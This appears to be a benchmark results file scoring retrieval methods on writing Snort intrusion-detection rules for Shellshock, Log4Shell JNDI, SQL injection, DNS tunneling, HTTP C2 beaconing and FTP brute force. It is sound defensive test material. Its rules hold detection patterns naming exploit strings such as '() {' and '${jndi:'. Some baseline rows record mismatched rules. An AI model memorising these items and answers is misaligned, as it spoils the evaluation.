Q_021,rag_hybrid,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0117,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,multi_hop,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0084,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_021,graph_rag,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8181818181818182,0.0,SNORT_0152,SNORT_0033;SNORT_0135;SNORT_0101;SNORT_0152;SNORT_0016,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000033; rev:1;)"
Q_021,agentic_rag,SOC ticket: suspicious Exploitation activity observed. Identify HTTP requests containing the Shellshock () { pattern.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0152,SNORT_0152;SNORT_0033;SNORT_0135;SNORT_0016;SNORT_0117,Exploitation,Exploitation,Shellshock CGI Pattern,Shellshock CGI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000152; rev:1;)"
Q_022,baseline,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0039,,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_022,rag_classic,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,0.5,0.6309297535714575,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0039,SNORT_0005;SNORT_0039;SNORT_0056;SNORT_0141;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000005; rev:1;)"
Q_022,rag_rerank,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0141;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,rag_hybrid,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,multi_hop,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0124;SNORT_0056;SNORT_0141,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,graph_rag,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0124;SNORT_0141;SNORT_0073;SNORT_0005,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_022,agentic_rag,Write a Snort rule for need IDS detection logic for SQL Injection: Detect SQL injection attempts using UNION SELECT in HTTP URI. Include protocol and threshold constraints.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0039,SNORT_0039;SNORT_0005;SNORT_0056;SNORT_0124;SNORT_0158,Web_Attack,Web_Attack,SQL Injection,SQL Injection,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000039; rev:1;)"
Q_023,baseline,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,1.0,SNORT_0134,,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_classic,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0032;SNORT_0049;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_rerank,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.2,0.38685280723454163,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0032;SNORT_0049;SNORT_0134,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,rag_hybrid,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,multi_hop,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0066;SNORT_0100;SNORT_0117;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,graph_rag,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0083,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_023,agentic_rag,Generate a Snort rule to rule for log4shell jndi pattern on the network.,0.0,0.0,1.0,0.25,0.43067655807339306,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0134,SNORT_0015;SNORT_0049;SNORT_0066;SNORT_0134;SNORT_0032,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000015; rev:1;)"
Q_024,baseline,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,1.0,SNORT_0115,,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000030; rev:1;)"
Q_024,rag_classic,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,rag_rerank,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,rag_hybrid,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,multi_hop,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,graph_rag,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0030;SNORT_0064;SNORT_0013,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_024,agentic_rag,Need IDS detection logic for DNS Tunneling: Generate a rule for suspected DNS tunneling over port 53. Include protocol and threshold constraints. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.227 count=47,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0115,SNORT_0115;SNORT_0149;SNORT_0064;SNORT_0030;SNORT_0047,DNS_Attack,DNS_Attack,DNS Tunneling,DNS Tunneling,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000115; rev:1;)"
Q_025,baseline,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.3076923076923077,1.0,SNORT_0045,,Web_Attack,Malware_C2,Directory Traversal,HTTP C2 Beacon,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000007; rev:1;)"
Q_025,rag_classic,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,rag_rerank,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,rag_hybrid,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0062;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,multi_hop,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0096;SNORT_0062,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_025,graph_rag,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8787878787878788,0.0,SNORT_0045,SNORT_0113;SNORT_0011;SNORT_0045;SNORT_0028;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000113; rev:1;)"
Q_025,agentic_rag,"I need detection for as a security analyst, I want to detect this behavior: Detect periodic HTTP beaconing using an old suspicious User-Agent header. Observed log: HTTP GET /gate.php every=60s user-agent=Mozilla/4.0 src=10.0.6.82 dst=198.51.100.201",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0045,SNORT_0045;SNORT_0113;SNORT_0028;SNORT_0062;SNORT_0096,Malware_C2,Malware_C2,HTTP C2 Beacon,HTTP C2 Beacon,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000045; rev:1;)"
Q_026,baseline,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.5,1.0,SNORT_0083,,Web_Attack,Exploitation,Directory Traversal,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible directory traversal attempt""; flow:to_server,established; content:""../""; http_uri; classtype:web-application-attack; sid:1000007; rev:1;)"
Q_026,rag_classic,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0100,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,rag_rerank,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0083,SNORT_0049;SNORT_0032;SNORT_0083;SNORT_0066;SNORT_0100,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000049; rev:1;)"
Q_026,rag_hybrid,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,multi_hop,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0151;SNORT_0049;SNORT_0032;SNORT_0066,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_026,graph_rag,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.8333333333333334,0.0,SNORT_0083,SNORT_0032;SNORT_0066;SNORT_0049;SNORT_0101;SNORT_0033,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000032; rev:1;)"
Q_026,agentic_rag,"Write a Snort rule for as a security analyst, I want to detect this behavior: Generate a Snort rule for HTTP payloads with ${jndi: patterns.",0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0083,SNORT_0083;SNORT_0049;SNORT_0032;SNORT_0066;SNORT_0151,Exploitation,Exploitation,Log4Shell JNDI Pattern,Log4Shell JNDI Pattern,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000083; rev:1;)"
Q_027,baseline,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.6451612903225806,1.0,SNORT_0129,,Brute_Force,Brute_Force,SSH Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:""Possible SSH brute force attempts""; flow:to_server,established; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:1000009; rev:1;)"
Q_027,rag_classic,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,rag_rerank,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,rag_hybrid,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,multi_hop,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,0.3333333333333333,0.5,1.0,1.0,1.0,1.0,1.0,0.9285714285714286,0.0,SNORT_0129,SNORT_0095;SNORT_0146;SNORT_0129;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000095; rev:1;)"
Q_027,graph_rag,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0112;SNORT_0061,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
Q_027,agentic_rag,Write a Snort rule for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,0.3333333333333333,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,0.0,SNORT_0129,SNORT_0129;SNORT_0095;SNORT_0146;SNORT_0061;SNORT_0112,Brute_Force,Brute_Force,FTP Brute Force,FTP Brute Force,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000129; rev:1;)"
